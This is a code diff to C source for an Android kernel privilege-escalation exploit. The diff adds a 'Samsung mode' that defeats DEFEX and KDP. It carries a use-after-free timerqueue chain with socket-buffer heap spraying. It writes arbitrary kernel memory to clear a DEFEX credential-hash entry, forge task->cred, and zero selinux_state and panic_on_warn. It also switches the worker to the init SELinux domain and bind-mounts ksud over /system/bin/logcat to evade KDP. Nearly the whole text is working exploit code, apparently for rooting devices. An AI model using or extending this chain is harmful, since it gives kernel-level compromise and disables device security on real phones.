@@ -32,6 +32,10 @@
  *     libksud.so -- including repackaged managers with randomized
  *     package names or renamed libraries -- and loads that manager's
  *     android14-6.1 module.
+ *     In Samsung mode (--samsung) there is no discovery: the bundled
+ *     diabl0w/KernelSU ksud is used, the manager is pinned to
+ *     me.weishu.kernelsu (versionName samsung-v*), and DEFEX/kdp are
+ *     handled by the vendor endgame below.
  *     The parent parks with its socket buffers holding the fake cred page.
  *
  * The trigger leaves a stale timerqueue node; every failed plant parks
@@ -55,6 +59,7 @@
 #include <time.h>
 #include <pthread.h>
 #include <sys/mman.h>
+#include <sys/mount.h>
 #include <sys/socket.h>
 #include <sys/syscall.h>
 #include <sys/wait.h>
@@ -76,10 +81,11 @@
 /*
  * App <-> binary interface version.  Bump it whenever the arguments or the
  * conf schema change incompatibly, and pass the same value from UserService.
- * The conf-driven rewrite is protocol 2: an older app starts the binary
+ * The conf-driven rewrite is protocol 2; protocol 3 adds the Samsung
+ * DEFEX/KDP endgame.  An older app starts the binary
  * without --conf/--protocol, which the binary detects and refuses.
  */
-#define APP_PROTOCOL 2
+#define APP_PROTOCOL 3
 #define EXIT_OLD_APP 78
 
 /*
@@ -90,6 +96,20 @@
 #define STRINGIFY_(x) #x
 #define STRINGIFY(x) STRINGIFY_(x)
 #define TIMER_PROTOCOL_MARKER "TIMER_PROTOCOL=" STRINGIFY(APP_PROTOCOL)
+/*
+ * Feature marker for the Samsung endgame.  The app scans the installed
+ * binary for this literal before it selects a Samsung profile: a binary
+ * without it is a generic build and would treat --samsung as a mode name.
+ */
+#define TIMER_SAMSUNG_MARKER "TIMER_SAMSUNG=1"
+/*
+ * Samsung mode is pinned to the diabl0w/KernelSU build.  It shares the
+ * upstream KernelSU package name (its release is identified by a
+ * samsung-v* manager versionName), so a profile that points at any other
+ * manager package is rejected instead of silently late-loading a
+ * mismatched ksud.
+ */
+#define SAMSUNG_MANAGER_PACKAGE "me.weishu.kernelsu"
 
 /*
  * Build-dependent constants, loaded from a HOCON conf at runtime.
@@ -104,7 +124,15 @@ struct target_profile
 {
     char name[96];
     char release[160];
+    /* Optional prefix form for Samsung builds whose uname -r carries a
+     * firmware suffix.  Only used when the profile explicitly sets it. */
+    char release_prefix[160];
     char ksu_kmi[64];
+    /* Samsung endgame: diabl0w/KernelSU manager package and the DEFEX
+     * creds_fast_hash table address (unslid). */
+    char samsung_package[96];
+    unsigned long long defex_creds_hash;
+    int samsung_mode;
     unsigned long page_size;
     unsigned int page_shift;
     unsigned int slab_order;
@@ -195,6 +223,9 @@ static char g_kernel[256] = "unknown";
 #define CRED_SIZE (g_tgt->cred_size)
 
 #define CRED_UID_OFF (g_tgt->cred_uid_off)
+#define CRED_EUID_OFF (g_tgt->cred_euid_off)
+/* Samsung DEFEX: creds_fast_hash is an 8-byte pointer array indexed by pid. */
+#define DEFEX_CREDS_HASH_STATIC (g_tgt->defex_creds_hash)
 
 /* task_struct / cred layout (BTF). */
 #define OFF_TASK_CRED (g_tgt->task_cred_off)
@@ -284,6 +315,8 @@ static void conf_defaults(void)
     g_cfg.fullcap = 0x1ffffffffffULL;
     g_cfg.selinux_blob_off = 0x0;
     g_cfg.selinux_sid_kernel = 1;
+    snprintf(g_cfg.samsung_package, sizeof(g_cfg.samsung_package),
+             SAMSUNG_MANAGER_PACKAGE);
     g_conf_overflow = 0;
 }
 
@@ -323,8 +356,14 @@ static void parse_conf_line(char *line)
         val++;
         if (!strcmp(key, "release"))
             snprintf(g_cfg.release, sizeof(g_cfg.release), "%s", val);
+        else if (!strcmp(key, "release_prefix"))
+            snprintf(g_cfg.release_prefix, sizeof(g_cfg.release_prefix),
+                     "%s", val);
         else if (!strcmp(key, "ksu_kmi"))
             snprintf(g_cfg.ksu_kmi, sizeof(g_cfg.ksu_kmi), "%s", val);
+        else if (!strcmp(key, "samsung_package"))
+            snprintf(g_cfg.samsung_package,
+                     sizeof(g_cfg.samsung_package), "%s", val);
         return;
     }
 
@@ -376,6 +415,9 @@ static void parse_conf_line(char *line)
     else if (!strcmp(key, "linear_max")) g_cfg.linear_max = num;
     else if (!strcmp(key, "pcp_free")) g_cfg.pcp_free = (int)num;
     else if (!strcmp(key, "alloc_req_off")) g_cfg.alloc_req_off = num;
+    else if (!strcmp(key, "defex_creds_hash"))
+        g_cfg.defex_creds_hash = num;
+    else if (!strcmp(key, "samsung_mode")) g_cfg.samsung_mode = (int)num;
 }
 
 /* A kernel release may or may not carry the "-4k" userspace suffix. */
@@ -390,6 +432,22 @@ static int release_matches(const char *a, const char *b)
     if (lb > 3 && !strcmp(b + lb - 3, "-4k"))
         lb -= 3;
     return la == lb && !strncmp(a, b, la);
+}
+
+/*
+ * Explicit prefix form, used only by profiles that set release_prefix.
+ * Every Samsung profile has a firmware-specific suffix after the kernel
+ * version, so exact matching cannot work across firmware updates.  The
+ * prefix ends at a '-' boundary so "6.1.162-android14" cannot accidentally
+ * match "6.1.162-android140".
+ */
+static int release_prefix_matches(const char *prefix, const char *running)
+{
+    size_t lp = strlen(prefix);
+
+    if (!lp || strncmp(prefix, running, lp))
+        return 0;
+    return running[lp] == '\0' || running[lp] == '-';
 }
 
 static int load_conf(const char *path)
@@ -433,6 +491,28 @@ static int load_conf(const char *path)
     {
         fprintf(stderr, "[-] conf release mismatch: conf=%s running=%s\n",
                 g_cfg.release, g_kernel);
+        return -1;
+    }
+    if (g_cfg.release_prefix[0] &&
+        !release_prefix_matches(g_cfg.release_prefix, g_kernel))
+    {
+        fprintf(stderr, "[-] conf release prefix mismatch: conf=%s running=%s\n",
+                g_cfg.release_prefix, g_kernel);
+        return -1;
+    }
+    if (g_cfg.samsung_mode && !g_cfg.defex_creds_hash)
+    {
+        fprintf(stderr,
+                "[-] samsung profile missing defex_creds_hash: %s\n", path);
+        return -1;
+    }
+    if (g_cfg.samsung_mode &&
+        strcmp(g_cfg.samsung_package, SAMSUNG_MANAGER_PACKAGE) != 0)
+    {
+        fprintf(stderr,
+                "[-] samsung profile targets %s; Samsung mode requires"
+                " the diabl0w/KernelSU build (%s)\n",
+                g_cfg.samsung_package, SAMSUNG_MANAGER_PACKAGE);
         return -1;
     }
     if (g_cfg.page_size != (unsigned long)sysconf(_SC_PAGESIZE))
@@ -570,6 +650,8 @@ static unsigned long long g_base;
 static unsigned long long g_slide;
 static int g_held;
 static int g_fake_stage;
+/* Samsung endgame: DEFEX creds_hash clear + KDP-safe ksud exec. */
+static int g_samsung_stage;
 /* Dry run: capture the victim slab and prove reclaim, but never arm the
  * victim timer, so no stale rb_node is created and reaping is safe. */
 static int g_probe;
@@ -1154,7 +1236,17 @@ static unsigned long long calibrate_base(unsigned char *raw)
             }
         logf("[base] made=%d site=%#llx slide=%#llx best=%#llx count=%llu\n",
              made, site0, site0 ? site0 - STATIC_TIMER_SITE : 0, best, bestc);
-        return bestc >= 4 ? best : 0;
+        if (bestc < 4)
+            return 0;
+        /*
+         * The fake endgame resolves symbols by slide before its first plant
+         * (DEFEX creds_hash, selinux_state), so the slide has to exist here.
+         * run_plant() recomputes it from the site it captures, which stays
+         * authoritative per write; this is only the pre-plant value.
+         */
+        if (site0)
+            g_slide = site0 - STATIC_TIMER_SITE;
+        return best;
     }
 }
 
@@ -1387,9 +1479,100 @@ static void build_payload(unsigned char *buf, size_t off,
     *(unsigned long long *)(buf + off + 0x10) = target;
 }
 
+/*
+ * Samsung endgame, ported from SamTimer / BuSung-dev Root-My-Galaxy:
+ *
+ *   - the worker is already in u:r:init:s0 and has bind-mounted the bundled
+ *     diabl0w/KernelSU ksud over /system/bin/logcat in a private mount
+ *     namespace, so KDP does not SIGKILL a directly-exec'ed kdp-variant ksud;
+ *   - the manager is pinned (me.weishu.kernelsu, samsung-v*), so there is no
+ *     pm/find/unzip ladder and no --version probe (a direct exec gets
+ *     KDP-killed and only adds noise);
+ *   - the bundled ksud supports --kmi/--allow-shell; --allow-shell is
+ *     required because the app's user service runs as the shell user and
+ *     drives `su -c` for every post-load command;
+ *   - SELinux is left to ksud's own restore.  Re-enforcing from userspace
+ *     races ksud and can kill system_server on OneUI.
+ */
+static void write_ksu_script_samsung(void)
+{
+    static const char script_head[] =
+        "#!/system/bin/sh\n"
+        "echo \"[ksu] begin uid=$(id -u) enf=$(getenforce)\"\n"
+        "echo \"[ksu] ctx=$(cat /proc/self/attr/current 2>/dev/null)\"\n"
+        "PKG='";
+    static const char script_tail[] =
+        "KSUD=/data/local/tmp/w/ksud\n"
+        "[ -x \"$KSUD\" ] || KSUD=/data/local/tmp/ksud\n"
+        "if [ ! -x \"$KSUD\" ]; then\n"
+        "  echo '[ksu] ksud missing'; echo KSU_MISSING; exit 1\n"
+        "fi\n"
+        "echo \"[ksu] ksud=$KSUD size=$(stat -c %s \"$KSUD\" 2>/dev/null)\"\n"
+        /* late-load registers the module asynchronously; probe with a
+         * settle delay like the reference does. */
+        "live() { sleep 1; grep -qi kernelsu /proc/modules 2>/dev/null "
+        "&& echo yes || echo no; }\n"
+        "LIVE=$(live)\n"
+        "echo \"[ksu] live_initial=$LIVE\"\n"
+        "if [ \"$LIVE\" = yes ]; then\n"
+        "  echo '[ksu] already_live'; echo KSU_LOADED; exit 0\n"
+        "fi\n"
+        /* If the C-side bind mount worked, /system/bin/logcat IS ksud
+         * (KDP-safe path).  Real logcat never prints ksud/KernelSU, and
+         * the diabl0w build identifies itself as samsung-vX.Y. */
+        "if /system/bin/logcat --version 2>/dev/null | "
+        "grep -qiE 'ksud|kernelsu|samsung-v'; then\n"
+        "  echo '[ksu] bind mount active, exec via logcat path'\n"
+        "  /system/bin/logcat late-load --allow-shell --kmi \"$KMI\" "
+        "--package-name \"$PKG\"\n"
+        "  RC=$?\n"
+        "else\n"
+        "  echo '[ksu] no bind mount; direct exec (KDP may kill)'\n"
+        "  \"$KSUD\" late-load --allow-shell --kmi \"$KMI\" "
+        "--package-name \"$PKG\"\n"
+        "  RC=$?\n"
+        "fi\n"
+        "echo \"[ksu] late-load rc=$RC\"\n"
+        "i=0\n"
+        "while [ $i -lt 50 ]; do\n"
+        "  grep -q '^kernelsu ' /proc/modules && break\n"
+        "  i=$((i+1)); sleep 0.1\n"
+        "done\n"
+        "if grep -q '^kernelsu ' /proc/modules; then\n"
+        "  echo '[ksu] module live'; echo KSU_LOADED\n"
+        "else\n"
+        "  echo '[ksu] module NOT live'; echo KSU_MISSING\n"
+        "fi\n"
+        /* Evidence that must survive a panic: the module's klog (KDP/RKP
+         * detection, hook installation) is only in dmesg. */
+        "dmesg | tail -n 4000 > /data/local/tmp/w/dmesg_after_load.log "
+        "2>&1\n"
+        "echo \"[ksu] enf=$(getenforce)\"\n";
+    int fd = open("/data/local/tmp/ksu_stage.sh",
+                  O_WRONLY | O_CREAT | O_TRUNC, 0755);
+
+    if (fd < 0)
+        return;
+    (void)!write(fd, script_head, sizeof(script_head) - 1);
+    (void)!write(fd, g_cfg.samsung_package,
+                 strlen(g_cfg.samsung_package));
+    (void)!write(fd, "'\nKMI=", 6);
+    (void)!write(fd, g_cfg.ksu_kmi, strlen(g_cfg.ksu_kmi));
+    (void)!write(fd, "\n", 1);
+    (void)!write(fd, script_tail, sizeof(script_tail) - 1);
+    close(fd);
+    (void)chmod("/data/local/tmp/ksu_stage.sh", 0755);
+}
+
 /* GhostLock's final stage, reduced to its root-child handoff. */
 static void write_ksu_script(void)
 {
+    if (g_samsung_stage)
+    {
+        write_ksu_script_samsung();
+        return;
+    }
+
     static const char script_head[] =
         "#!/system/bin/sh\n"
         "echo \"[ksu] start uid=$(id -u) selinux=$(getenforce)\"\n"
@@ -1594,6 +1777,7 @@ struct plant_res
 
 static void run_plant(unsigned long long target, int tag, int mode,
                       struct plant_res *res, unsigned char *raw);
+static void pool_reset(void);
 
 static int stage_write(unsigned long long target, int mode,
                        const char *what, unsigned char *raw,
@@ -1603,6 +1787,10 @@ static int stage_write(unsigned long long target, int mode,
 
     for (int attempt = 1; attempt <= 3; attempt++)
     {
+        /* Fresh pool per attempt: the previous attempt's payloads are dead
+         * weight the moment its plant ended, and starting a burst inside
+         * full queues starves the reclaim (see pool_reset). */
+        pool_reset();
         memset(&r, 0, sizeof(r));
         logf("[+] stage %s target=%#llx mode=%s attempt=%d\n", what, target,
              mode == 2 ? "fake" : "zero", attempt);
@@ -1628,8 +1816,20 @@ static int stage_write(unsigned long long target, int mode,
 #define SPRAY_PRE 2000
 #define SPRAY_POST 10000
 static _Atomic int g_burst, g_burst2, g_stop_spray;
-static int g_pool[SPRAY_SOCKS][2];
+/*
+ * Two spray pools.  pool_a is the scratch pool until the fake-cred stage
+ * lands; its queued skbuffs then hold the page the child's cred points
+ * into, so it is pinned for the life of the process.  Every stage after
+ * that runs on pool_b, which is released and refilled at each attempt so a
+ * burst never starts inside a queue already filled by the previous plant.
+ */
+static int g_pool_a[SPRAY_SOCKS][2];
+static int g_pool_a_n;
+static int g_pool_b[SPRAY_SOCKS][2];
+static int g_pool_b_n;
+static int (*g_pool)[2]; /* active pool for the plant in flight */
 static int g_pool_n;
+static int g_fake_pinned;
 static int g_rawfd[8] = {-1, -1, -1, -1, -1, -1, -1, -1};
 static _Atomic int g_spray_tids[SPRAY_THREADS];
 
@@ -1639,7 +1839,7 @@ struct spray_arg
     int sock_first, sock_count, cpu, idx;
 };
 
-static void ensure_pool(void)
+static void pool_fill(void)
 {
     int snd = 16 << 20;
 
@@ -1655,6 +1855,45 @@ static void ensure_pool(void)
     }
     if (!g_pool_n)
         park_forever("no spray sockets");
+}
+
+/*
+ * Release the spray pool the previous attempt filled and point g_pool at a
+ * fresh one.  Closing both ends of every socketpair purges the queued
+ * skbuffs and returns their pages to the buddy immediately, so the next
+ * burst gets the full sndbuf instead of whatever the last plant left over.
+ *
+ * The one pool that must never be released is pool_a once g_fake_pinned is
+ * set: its queues hold the fake cred page the child's task->cred points
+ * into, and freeing a socket that still queues one of those skbuffs frees
+ * the page under a live cred.  Before that, pool_a is scratch -- a
+ * completed zero stage's rb node was erased from its tree when the child
+ * was reaped and nothing else references payload content, so releasing is
+ * safe on every path that reaches here (success, retryable exec, spill,
+ * held-zombie miss: a missed plant is never reaped, so its stale nodes are
+ * never dereferenced).
+ */
+static void pool_reset(void)
+{
+    int (*p)[2] = g_fake_pinned ? g_pool_b : g_pool_a;
+    int n = g_fake_pinned ? g_pool_b_n : g_pool_a_n;
+
+    for (int i = 0; i < n; i++)
+    {
+        close(p[i][0]);
+        close(p[i][1]);
+    }
+    if (g_fake_pinned)
+    {
+        g_pool_b_n = 0;
+        g_pool = g_pool_b;
+    }
+    else
+    {
+        g_pool_a_n = 0;
+        g_pool = g_pool_a;
+    }
+    g_pool_n = 0;
 }
 
 static void ensure_raw(void)
@@ -1739,12 +1978,22 @@ static void *spray_thread(void *x)
         sched_yield();
     if (atomic_load(&g_stop_spray))
         return NULL;
+    /*
+     * MSG_DONTWAIT on every spray write.  The Samsung chain recycles its
+     * pool per attempt (pool_reset), but the single-stage paths still
+     * retry run_plant on one shared pool, and a full pool must never park
+     * a thread inside write() forever -- pthread_join() then never
+     * returns and the chain hangs.  A write that would block queues no
+     * new skbuff anyway, so EAGAIN drops it without changing the reclaim
+     * geometry: the same bytes still land, the same page allocations
+     * still happen, they just cannot park a thread.
+     */
     /* Phase 1 runs before the target execs; it catches an early free. */
     while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE)
     {
         int k = a->sock_first + (w % a->sock_count);
 
-        (void)write(g_pool[k][0], a->payload, SOCKBUF);
+        (void)send(g_pool[k][0], a->payload, SOCKBUF, MSG_DONTWAIT);
         w++;
     }
     /* Phase 2 is released when the parent sees the victim page free. */
@@ -1754,7 +2003,7 @@ static void *spray_thread(void *x)
     {
         int k = a->sock_first + (w % a->sock_count);
 
-        (void)write(g_pool[k][0], a->payload, SOCKBUF);
+        (void)send(g_pool[k][0], a->payload, SOCKBUF, MSG_DONTWAIT);
         w++;
     }
     return NULL;
@@ -1771,6 +2020,9 @@ static void run_plant(unsigned long long target, int tag, int mode,
     struct spray_arg args[SPRAY_THREADS];
     int ready_p[2], ack_p[2], tid_p[2], timer_go[2];
     memset(res, 0, sizeof(*res));
+    /* stage_write resets the pool per attempt; direct callers arrive with
+     * the run-long pool already filled, so this is a no-op there. */
+    pool_fill();
     if (pipe(ready_p) || pipe(ack_p) || pipe(tid_p) || pipe(timer_go))
     {
         logf("[-] plant%d pipe failed\n", tag);
@@ -2188,6 +2440,13 @@ static void run_plant(unsigned long long target, int tag, int mode,
     {
         logf("[-] plant%d burst missed; holding zombie\n", tag);
         g_held++;
+        /*
+         * Nothing was written and the zombie is held (never reaped), so no
+         * state is pinned: a fresh plant with a fresh pool is a clean
+         * retry.  Direct callers already loop on !ok; without this flag
+         * stage_write would treat the first miss as fatal for the stage.
+         */
+        res->retry = 1;
         return;
     }
 
@@ -2200,6 +2459,13 @@ static void run_plant(unsigned long long target, int tag, int mode,
     logf("[+] plant%d reaped status=%#x\n", tag, st);
     res->A = mode == 2 ? V + TIMER_NODE_OFF + FAKE_CRED_OFF : V + TIMER_NODE_OFF;
     res->ok = 1;
+    if (mode == 2)
+    {
+        /* The queued fake-cred payloads now hold a live cred's page:
+         * pool_a is pinned for the life of the process from here on. */
+        g_fake_pinned = 1;
+        logf("[+] fake cred page pinned (pool held)\n");
+    }
     logf("[+] plant%d write mode=%s target=%#llx\n", tag,
          mode == 2 ? "fake" : "zero", target);
     free(payload);
@@ -2364,7 +2630,9 @@ static unsigned long long leak_cred(unsigned char *raw,
             {
                 const char *cmode = shell_mode ? "shell" : (g_fake_stage ? "fake" : "verify");
                 char *const av[] = {(char *)"/proc/self/exe", (char *)"wait",
-                                    (char *)cmode, NULL};
+                                    (char *)cmode,
+                                    g_samsung_stage ? (char *)"samsung" : NULL,
+                                    NULL};
                 char *const ep[] = {(char *)"PATH=/system/bin:/system/xbin", NULL};
 
                 execve("/proc/self/exe", av, ep);
@@ -2420,7 +2688,38 @@ static unsigned long long leak_cred(unsigned char *raw,
     return 0;
 }
 
-static int wait_child_main(const char *mode)
+/*
+ * Samsung KDP-safe exec setup.  The worker has a real, uid-0 cred here, so
+ * it can move to the init domain while SELinux is still permissive.  The
+ * private mount namespace is essential: the bind mount must never outlive
+ * this worker or the next real logcat call would execute ksud.
+ */
+static void samsung_worker_setup(void)
+{
+    int cfd = open("/proc/self/attr/current", O_WRONLY);
+
+    if (cfd >= 0)
+    {
+        (void)!write(cfd, "u:r:init:s0", 11);
+        close(cfd);
+    }
+    else
+        logf("[samsung] init-domain switch failed errno=%d\n", errno);
+
+    if (unshare(CLONE_NEWNS) == 0)
+    {
+        (void)mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL);
+        if (mount("/data/local/tmp/w/ksud", "/system/bin/logcat", NULL,
+                  MS_BIND, NULL) != 0)
+            logf("[samsung] bind mount failed errno=%d\n", errno);
+        else
+            logf("[samsung] bind mount active (/system/bin/logcat -> ksud)\n");
+    }
+    else
+        logf("[samsung] unshare failed errno=%d\n", errno);
+}
+
+static int wait_child_main(const char *mode, int samsung)
 {
     struct child_report rep;
     char ch;
@@ -2487,6 +2786,12 @@ static int wait_child_main(const char *mode)
                  rep.rsuid);
             if (su != 0)
                 _exit(4);
+            if (samsung)
+            {
+                logf("[samsung] worker uid=%d euid=%d; preparing KDP-safe exec\n",
+                     rep.uid, rep.euid);
+                samsung_worker_setup();
+            }
             execve("/system/bin/sh", av, envp);
             _exit(127);
         }
@@ -2595,7 +2900,7 @@ static void detect_device(void)
 static void print_usage(const char *argv0)
 {
     fprintf(stderr,
-            "usage: %s --conf <conf> [--protocol N]"
+            "usage: %s --conf <conf> [--protocol N] [--samsung]"
             " [ids|leak|shell|fake|permissive] [target|selfcheck|probe|cpu N]\n",
             argv0 ? argv0 : "timer");
 }
@@ -2645,7 +2950,8 @@ int main(int argc, char **argv)
          argc > 0 && argv[0] ? argv[0] : "(null)",
          argc > 1 ? argv[1] : "(none)");
     if (argc > 1 && !strcmp(argv[1], "wait"))
-        return wait_child_main(argc > 2 ? argv[2] : "verify");
+        return wait_child_main(argc > 2 ? argv[2] : "verify",
+                               argc > 3 && !strcmp(argv[3], "samsung"));
 
     /*
      * The trigger re-execs this binary with argv[0]="" purely to consume the
@@ -2688,6 +2994,11 @@ int main(int argc, char **argv)
             app_protocol = atoi(argv[argi + 1]);
             argi += 2;
         }
+        else if (!strcmp(argv[argi], "--samsung"))
+        {
+            g_samsung_stage = 1;
+            argi++;
+        }
         else
         {
             break;
@@ -2727,8 +3038,28 @@ int main(int argc, char **argv)
     }
     if (load_conf(conf_path))
         return 1;
+    if (g_samsung_stage)
+    {
+        if (!g_cfg.samsung_mode)
+        {
+            fprintf(stderr,
+                    "[-] --samsung requires a samsung_mode=1 profile\n");
+            return 1;
+        }
+        if (!g_fake_stage && !g_selinux_target && !g_probe && !leak_only &&
+            !ids_only && !(mode && (!strcmp(mode, "target") ||
+                                    !strcmp(mode, "selfcheck"))))
+        {
+            fprintf(stderr, "[-] --samsung supports "
+                    "fake|permissive|leak|probe|ids|target|selfcheck\n");
+            return 1;
+        }
+    }
     logf("[+] device=%s kernel=%s pagesize=%ld profile=%s conf=%s\n",
          g_device, g_kernel, sysconf(_SC_PAGESIZE), g_tgt->name, conf_path);
+    if (g_samsung_stage)
+        logf("[+] samsung endgame enabled (package=%s defex=%#llx)\n",
+             g_cfg.samsung_package, DEFEX_CREDS_HASH_STATIC);
 
     /* Lets the app confirm a downloaded binary targets this exact build.
      * Keep target=lynx for the app's existing check. */
@@ -2737,10 +3068,12 @@ int main(int argc, char **argv)
     if (mode && !strcmp(mode, "target"))
     {
         printf("target=lynx\ndevice=%s\nkernel=%s\npagesize=%lu\n"
-               "profile=%s\nconf=%s\ntimer_site=%#llx\nprotocol=%d\n%s\n",
+               "profile=%s\nconf=%s\ntimer_site=%#llx\nprotocol=%d\n"
+               "samsung=%d\n%s\n%s\n",
                g_device, g_kernel, (unsigned long)PAGE, g_tgt->name,
                conf_path, (unsigned long long)STATIC_TIMER_SITE,
-               APP_PROTOCOL, TIMER_PROTOCOL_MARKER);
+               APP_PROTOCOL, g_cfg.samsung_mode, TIMER_PROTOCOL_MARKER,
+               TIMER_SAMSUNG_MARKER);
         return 0;
     }
 
@@ -2810,7 +3143,7 @@ int main(int argc, char **argv)
     }
     if (g_fake_stage)
         write_ksu_script();
-    ensure_pool();
+    g_pool = g_pool_a; /* each plant fills its active pool on entry */
     ensure_raw();
 
     if (g_selinux_target)
@@ -2859,6 +3192,25 @@ int main(int argc, char **argv)
         if (!g_child_task)
             park_forever("child task not leaked");
         memset(&fc, 0, sizeof(fc));
+        if (!g_slide)
+            park_forever("no KASLR slide");
+        if (g_samsung_stage)
+        {
+            /*
+             * Samsung DEFEX: task_defex_check_creds() looks this pid up in
+             * creds_fast_hash and compares the stored uid with the forged
+             * one.  A NULL bucket entry makes get_task_creds() return uid 0,
+             * which matches the forged cred, so the violation check passes.
+             * Clear it before the cred swap, in the same order as the
+             * tested SamTimer chain; the child is still blocked on the go
+             * pipe, so it cannot be checked before this write lands.
+             */
+            if (stage_write(DEFEX_CREDS_HASH_STATIC + g_slide +
+                                (unsigned long long)C * 8,
+                            0, "defex_hash", raw, NULL))
+                park_forever("defex hash clear failed");
+            logf("[+] DEFEX creds_hash[%d] cleared\n", C);
+        }
         /*
          * Point task->cred at the fake cred inside the reclaimed page.  The
          * fake cred sits at node+0x18, so rb_erase publishes it through
@@ -2869,8 +3221,6 @@ int main(int argc, char **argv)
         if (stage_write(g_child_task + OFF_TASK_CRED, 2, "fake_cred",
                         raw, &fc))
             park_forever("fake cred write failed");
-        if (!g_slide)
-            park_forever("no KASLR slide");
         logf("[+] fake cred A=%#llx selinux_state=%#llx\n", fc.A,
              SELINUX_STATE_STATIC + g_slide);
         if (stage_write(SELINUX_STATE_STATIC + g_slide - 7, 0,
@@ -2880,6 +3230,18 @@ int main(int argc, char **argv)
             stage_write(PANIC_ON_WARN_STATIC + g_slide, 0,
                         "panic_on_warn", raw, NULL))
             park_forever("panic_on_warn write failed");
+        if (g_samsung_stage)
+        {
+            /*
+             * SamTimer repairs uid/euid after the erase.  The conf-driven
+             * fake-cred payload already zeroes both, but the repair is cheap
+             * and keeps the Samsung path identical to the tested chain.
+             */
+            if (stage_write(fc.A + CRED_UID_OFF, 0, "fake_uid", raw, NULL))
+                park_forever("fake uid fix failed");
+            if (stage_write(fc.A + CRED_EUID_OFF, 0, "fake_euid", raw, NULL))
+                park_forever("fake euid fix failed");
+        }
     }
     logf("[+] cred writes landed, waking child\n");
 
